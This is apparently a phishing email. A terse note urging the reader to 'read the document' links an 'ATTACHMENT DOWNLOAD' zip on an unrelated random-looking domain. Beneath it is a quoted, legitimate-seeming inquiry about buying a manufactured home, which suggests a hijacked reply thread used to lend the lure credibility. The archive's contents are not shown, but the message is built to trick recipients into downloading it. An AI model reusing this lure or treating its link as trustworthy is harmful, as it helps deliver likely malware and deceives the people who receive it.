<p>Hello,</p><br/><br/><p>Read the document and let me know what you think.</p><br/><br/><p><a href="http://wiblitz6.com/rtphasxy/aVUav1oT4N.zip">ATTACHMENT DOWNLOAD</a></p><br/><br/><p><br /><br/>Thanks.</p><br/><br><blockquote type="cite">﻿Good Afternoon,

My name is Brandon Colbert and I recently just inquired about “The Parkside” manufactured home you guys have for sale. I forgot to ask if it was still available? I just found the land I want to put it on and I am very interested in the home, but will not be able to make it down to your site to look at it in person until Friday. Unless I get down there and it looks nothing like the pictures on the website I am wanting to proceed in the buying process.

Also, I was wanting to ask if I could get a credit application to fill out? I will be applying for the financing of both the home and the land to put the home on. 

I look forward to hearing from you soon!

Best Regards, 
Brandon Colbert
